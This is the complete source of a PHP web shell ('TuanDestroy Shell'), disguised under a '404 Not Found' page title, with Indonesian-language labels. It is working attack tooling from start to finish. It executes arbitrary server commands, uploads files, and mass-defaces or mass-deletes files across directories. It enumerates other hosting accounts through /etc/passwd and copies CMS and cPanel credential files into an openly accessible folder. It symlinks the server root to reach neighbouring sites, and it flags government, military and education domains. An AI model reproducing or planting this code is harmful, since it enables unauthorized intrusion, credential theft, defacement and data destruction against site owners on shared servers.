 <html>
 <head>
<link href="https://fonts.googleapis.com/css?family=Gloria+Hallelujah|Patrick+Hand|Droid+Sans+Mono" rel="stylesheet">
 <link href='http://res7ock.org/assets/img/favicon.png' rel='shortcut icon' alt='icon'>
 <title>404 Not Found</title>
 <center><h1>[ ./TuanDestroy Shell ]</h1></center>
 <center><img src="https://files.gamebanana.com/img/ico/sprays/5c3b43a13234b.gif" width="250px" height="250px"></center>
 <meta name='author' content='Ngentod Lo'>
 <meta charset="UTF-8">
<meta property="og:image" content="http://oi66.tinypic.com/zn0xs.jpg" alt="53430105-557504214770012-2414548526572814332-n" "="">
<meta name="Description" content="D704T....">
<link href="" rel="stylesheet" type="text/css">
<style>
body{
       font-family: 'Droid Sans Mono', cursive;
	background-image: url("");
	color:#DBDBDB;
	background-attachment:fixed;
	background-repeat:no-repeat;
	background-position:center;
	background-color:#000;
	-webkit-background-size: 100% 100%;
}
#content tr:hover{
background-color: #666666;
}
#content .first{
background-color: #666666;
}
th{
height: 50px;
}
a{
color: #DBDBDB;
text-decoration: none;
font-family: 'Droid Sans Mono', cursive;
}
a:hover{
color:#ADADAD;
}
input,select{
color:#000;
background-color:#D0D5D5;
border: 1px #ADADAD solid;
-moz-border-radius: 3px;
-webkit-border-radius:3px;
border-radius:3px;
padding: 2px;
}
textarea{
background-color:transparent;
border: 1px #D0D5D5 solid;
color:#ADADAD;
}
.tombols{
background: #D0D5D5;
color:#000;
border-top:0;
border-left:0;
border-right:0;
border: 1px #ADADAD solid;
padding:5px 6px;
text-decoration:none;
font-family: 'Droid Sans Mono', cursive;
border-radius:2px;
}
.tombols:hover{
background-color:#ADADAD;
color:#000;
}
h1{
color:red;
font-family: 'Gloria Hallelujah', cursive;
}
</style>
</head>
<link href="https://fonts.googleapis.com/css?family=Courgette" rel="stylesheet">
<link href="https://fonts.googleapis.com/css?family=Sarpanch|Teko" rel="stylesheet">
<?php
set_time_limit(0);
error_reporting(0);

//function
function ambilKata($param, $kata1, $kata2){
   if(strpos($param, $kata1) === FALSE) return FALSE;
   if(strpos($param, $kata2) === FALSE) return FALSE;
   $start = strpos($param, $kata1) + strlen($kata1);
   $end = strpos($param, $kata2, $start);
   $return = substr($param, $start, $end - $start);
   return $return;
}
if(get_magic_quotes_gpc()) {
   function idx_ss($array) {
return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
   }
   $_POST = idx_ss($_POST);
}
function hdd($s) {
   if($s >= 1073741824)
   return sprintf('%1.2f',$s / 1073741824 ).' GB';
   elseif($s >= 1048576)
   return sprintf('%1.2f',$s / 1048576 ) .' MB';
   elseif($s >= 1024)
   return sprintf('%1.2f',$s / 1024 ) .' KB';
   else
   return $s .' B';
}
function exe($cmd) {
   if(function_exists('system')) {        
@ob_start();       
@system($cmd);     
$buff = @ob_get_contents();        
@ob_end_clean();       
return $buff;  
   } elseif(function_exists('exec')) {        
@exec($cmd,$results);      
$buff = "";        
foreach($results as $result) {         
   $buff .= $result;      
} return $buff;    
   } elseif(function_exists('passthru')) {        
@ob_start();       
@passthru($cmd);       
$buff = @ob_get_contents();        
@ob_end_clean();       
return $buff;  
   } elseif(function_exists('shell_exec')) {      
$buff = @shell_exec($cmd);     
return $buff;  
   }
}
//check dir
$nick = "3X0RC1ST";
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$software = getenv("SERVER_SOFTWARE");
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
$dir = str_replace("\\","/",$dir);
$scdir = explode("/", $dir);
$freespace = hdd(disk_free_space("/"));
$total = hdd(disk_total_space("/"));
$used = $total - $freespace;
if(!function_exists('posix_getegid')) {
   $user = @get_current_user();
   $uid = @getmyuid();
   $gid = @getmygid();
   $group = "?";
} else {
   $uid = @posix_getpwuid(posix_geteuid());
   $gid = @posix_getgrgid(posix_getegid());
   $user = $uid['name'];
   $uid = $uid['uid'];
   $group = $gid['name'];
   $gid = $gid['gid'];
} 
//uname
echo "<center><font color=#D0D5D5 size=2>System : <font color=#52CF38>".php_uname()."</font></font><br>";
echo "<center><font color=#D0D5D5 size=2>Time On Server : <font color=#52CF38>".date("d M Y H:i:s",time())."</font></font><br>";
echo "<center><font color=#D0D5D5 size=2>Server IP : <font color=#52CF38>".gethostbyname($_SERVER['HTTP_HOST'])."<font color=#D0D5D5> | Your IP : <font color=#52CF38>".$_SERVER['REMOTE_ADDR']."</font></font><br>";
echo "<center><font color=#D0D5D5 size=2>User : <font color=#52CF38>".$user."</font> (".$uid.") Group : <font color=#52CF38>".$group."</font> (".$gid.")<br></font>";
echo "<br><center><font color=#D0D5D5 size=3>Current Dir : </font>";
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '"><font color=#D0D5D5 size=3>'.$pat.'</font></a>/';
}

#TOOLBAR
echo "<hr color=#666666>
<br></center>
<font size=3><a href='?' class='tombols'>Home</a>
<font size=3><a href='?path=$path&jomblo=mass_deface' class='tombols'>Mass Deface</a>
<font size=3><a href='?path=$path&jomblo=config' class='tombols'>Config</a>
<font size=3><a href='?path=$path&jomblo=mass_delete' class='tombols'>Mass Delete</a><br><br>
<font size=3><a href='?path=$path&jomblo=upload' class='tombols'>Upload</a>
<font size=3><a href='?path=$path&jomblo=jumping' class='tombols'>Jumping</a>
<font size=3><a href='?path=$path&jomblo=symlink' class='tombols'>Symlink</a>
</center><br>
<hr color=#666666><center>";

/*uploads*/
if($_GET['jomblo'] == 'upload') {
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="#52CF38">Upload Sukses Senpai!!</font><br />';
}else{
echo '<font color="#666666">Upload Gagal Senpai!!</font><br />';
}
}
echo '<form enctype="multipart/form-data" method="POST"><font color="#D0D5D5" size="4"><br>
Upload File :<br><input type="file" name="file" />
<input type="submit" value="Upload" />
</form><br>
</td></tr>';	

//MASS Deface
} elseif(isset($_GET['jomblo']) && ($_GET['jomblo'] == 'mass_deface')){
	function sabun_massal($dir,$namafile,$isi_script) {
		foreach($j as $lokasi)
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							
							echo "[<font color=#52CF38>Selesai</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=#52CF38>Selesai</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font>Type  Sabun :</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massal<br>
	<font>Folder :</font><br>
	<input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
	<font>Filename :</font><br>
	<input type='text' name='d_file' value='jefriganteng.php' style='width: 450px;' height='10'><br>
	<font>Index File :</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Pastekan Script deface Kalian disini!</textarea><br>
	<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
	</form></center>";
	}
	}

//MASS DELETE/////////////////////////
elseif($_GET['jomblo'] == 'mass_delete') {
   function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = hapus_massal($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "<form method='post'>
   <font>Folder :</font><br>
   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font>Filename :</font><br>
   <input type='text' name='d_file' value='jefriganteng.php' style='width: 450px;' height='10'><br>
   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form></center>";
   }

##JUMPING 
} elseif($_GET['jomblo'] == 'jumping') {
   $i = 0;
   echo "<pre><div class='margin: 5px auto;'>";
   $etc = fopen("/etc/passwd", "r") or die("<font color=#666666>Can't read /etc/passwd</font>");
   while($passwd = fgets($etc)) {
if($passwd == '' || !$etc) {
   echo "<font color=#666666>Can't read /etc/passwd</font>";
} else {
   preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
   foreach($user_jumping[1] as $user_jefri_jump) {
       $user_jumping_dir = "/home/$user_jefri_jump/public_html";
       if(is_readable($user_jumping_dir)) {
           $i++;
           $jrw = "[<font color=#52CF38>R</font>] <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a>";
           if(is_writable($user_jumping_dir)) {
               $jrw = "[<font color=#52CF38>RW</font>] <a href='?dir=$user_jumping_dir'><font color=#D0D5D5>$user_jumping_dir</font></a>";
           }
           echo $jrw;
           if(function_exists('posix_getpwuid')) {
               $domain_jump = file_get_contents("/etc/named.conf");   
               if($domain_jump == '') {
                   echo " => ( <font color=#666666>gagal mengambil nama domain nya</font> )<br>";
               } else {
                   preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
                   foreach($domains_jump[1] as $dj) {
                       $user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
                       $user_jumping_url = $user_jumping_url['name'];
                       if($user_jumping_url == $user_jefri_jump) {
                           echo " => ( <u>$dj</u> )<br>";
                           break;
                       }
                   }
               }
           } else {
               echo "<br>";
           }
       }
   }
}
   }
   if($i == 0) {
   } else {
echo "<br>Total ada ".$i." Kamar ada ".gethostbyname($_SERVER['HTTP_HOST'])."";
   
   echo "</div></pre>";
		}

//CONFIG///////////
} elseif($_GET['jomblo'] == 'config') {
   $etc = fopen("/etc/passwd", "r") or die("<pre><font color=#666>Can't read /etc/passwd</font></pre>");
   $idx = mkdir("3X0RC1ST_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("3X0RC1ST_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
if($passwd == "" || !$etc) {
   echo "<font color=#666>Can't read /etc/passwd</font>";
} else {
   preg_match_all('/(.*?):x:/', $passwd, $user_config);
   foreach($user_config[1] as $user_3X0RC1ST) {
       $user_config_dir = "/home/$user_3X0RC1ST/public_html/";
       if(is_readable($user_config_dir)) {
           $grab_config = array(
               "/home/$user_3X0RC1ST/.my.cnf" => "cpanel",
               "/home/$user_3X0RC1ST/.accesshash" => "WHM-accesshash",
               "/home/$user_3X0RC1ST/public_html/vdo_config.php" => "Voodoo",
               "/home/$user_3X0RC1ST/public_html/bw-configs/config.ini" => "BosWeb",
               "/home/$user_3X0RC1ST/public_html/config/koneksi.php" => "Lokomedia",
               "/home/$user_3X0RC1ST/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
               "/home/$user_3X0RC1ST/public_html/clientarea/configuration.php" => "WHMCS",
               "/home/$user_3X0RC1ST/public_html/whm/configuration.php" => "WHMCS",
               "/home/$user_3X0RC1ST/public_html/whmcs/configuration.php" => "WHMCS",
               "/home/$user_3X0RC1ST/public_html/forum/config.php" => "phpBB",
               "/home/$user_3X0RC1ST/public_html/sites/default/settings.php" => "Drupal",
               "/home/$user_3X0RC1ST/public_html/config/settings.inc.php" => "PrestaShop",
               "/home/$user_3X0RC1ST/public_html/app/etc/local.xml" => "Magento",
               "/home/$user_3X0RC1ST/public_html/joomla/configuration.php" => "Joomla",
               "/home/$user_3X0RC1ST/public_html/configuration.php" => "Joomla",
               "/home/$user_3X0RC1ST/public_html/wp/wp-config.php" => "WordPress",
               "/home/$user_3X0RC1ST/public_html/wordpress/wp-config.php" => "WordPress",
               "/home/$user_3X0RC1ST/public_html/wp-config.php" => "WordPress",
               "/home/$user_3X0RC1ST/public_html/admin/config.php" => "OpenCart",
               "/home/$user_3X0RC1ST/public_html/slconfig.php" => "Sitelok",
               "/home/$user_3X0RC1ST/public_html/application/config/database.php" => "Ellislab");
           foreach($grab_config as $config => $nama_config) {
               $ambil_config = file_get_contents($config);
               if($ambil_config == '') {
               } else {	
                   $file_config = fopen("3X0RC1ST_CONFIG/$user_jefri-$nama_config.txt","w");
                   fputs($file_config,$ambil_config);
               }
           }
       }      
   }
}  
   }
   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
//symlink
} elseif(isset($_GET['jomblo']) && ($_GET['jomblo'] == 'symlink')) {	 
	 echo " <form action= method=post>";
@set_time_limit(0);
echo "<center><font color=#DBDBDB>";
@mkdir('sym',0777); 
$htaccess = "Options all \n DirectoryIndex sym.html \n AddType text/plain .php \n AddHandler server-parsed .php \n AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any"; $write =@fopen ('sym/.htaccess','w'); fwrite($write ,$htaccess); @symlink('/','sym/root'); $filelocation = basename(__FILE__); $read_named_conf = @file('/etc/named.conf'); if(!$read_named_conf) { echo "<br><br><font color='#666666'>Cant access this file on server -> [ /etc/named.conf ]</font></center>"; } else { echo "<table width='700px' border='1' cellpadding='3' cellspacing='0' align='center'><td style='background:#666;color:#000;'>Domain</td><td style='background:#666;color:#000;'>Users</td><td style='background:#666;color:#000;'>Symlink </td>"; foreach($read_named_conf as $subject){ if(eregi('zone',$subject)){ preg_match_all('#zone "(.*)"#',$subject,$string); flush(); if(strlen(trim($string[1][0])) >2){ $UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0])); $name = $UID['name'] ; @symlink('/','sym/root'); $name = $string[1][0]; $iran = '\.ir'; $israel = '\.il'; $indo = '\.id'; $sg12 = '\.sg'; $edu = '\.edu'; $gov = '\.gov'; $gose = '\.go'; $gober = '\.gob'; $mil1 = '\.mil'; $mil2 = '\.mi'; if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0]) or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])) { $name = "<font color=#D0D5D5>".$string[1][0].'</font>'; } echo " <tr> <td><a target=_blank href=http://www.".$string[1][0].'/>'.$name.' </a>  </td> <td style=border-left:1px solid #52CF38;> '.$UID['name']." </td> <td style=border-left:1px solid white;> <a href=sym/root/home/".$UID['name']."/public_html target=_blank>Symlink </a> </td> </tr>"; flush(); } } } } echo "</center></table></font>"; 

//*START*//
} elseif(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br />';
echo(' <center><textarea style="width:655px;height:300px;" readonly> '.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea></center>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br />'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#52CF38">Ganti  Permission Berhasil</font><br />';
}else{
echo '<font color="#666666">Ganti Permission Gagal</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Chmod" />
</form>';
}elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="#52CF38">Ganti Nama Berhasil</font><br />';
}else{
echo '<font color="#666666">Ganti Nama Gagal</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
Nama Baru : <input name="newname" type="text" size="30" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Ubah Nama" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="#52CF38">Edit File Berhasil</font><br />';
}else{
echo '<font color="#bd29ff">Edit File Gagal</font><br />';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Edit File" />
</form>';
}
echo '</center>';
}else{
echo '</table><br /><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="#52CF38">Hapus Dir Berhasil</font><br />';
}else{
echo '<font color="#666666">Hapus Dir Gagal</font><br />';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="#52CF38">Hapus File Berhasil</font><br />';
}else{
echo '<font color="#666666">Hapus File Gagal</font><br />';
}
}
}
		
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="705px" border="0" cellpadding="4" cellspacing="0" align="center">
<tr class="first">
<th><center><font color=#000 size=3>Name</font></center></th>
<th><center><font color=#000 size=3>Size</font></center></th>
<th><center><font color=#000 size=3>Permissions</font></center></th>
<th><center><font color=#000 size=3>Options</font></center></th>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>---</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="#52CF38">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="#DBDBDB">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">  </option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\"Go\" />
</form></center></td>
</tr>";
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>".$size."</center></td>
<td><center>";
if(is_writable("$path/$file")) echo '<font color=#52CF38>';
elseif(!is_readable("$path/$file")) echo '<font color=#DBDBDB>';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"Select\">  </option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\"Go\" />
</form></center></td>
</tr>";
}
echo '</table>
</div>';
}
echo '<br /><center><font size=3 ; color=#DBDBDB>&copy; Copyright 2k19 |<font color="#52CF38">./TuanDestroy</font></center>

</body>
</html>';
function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>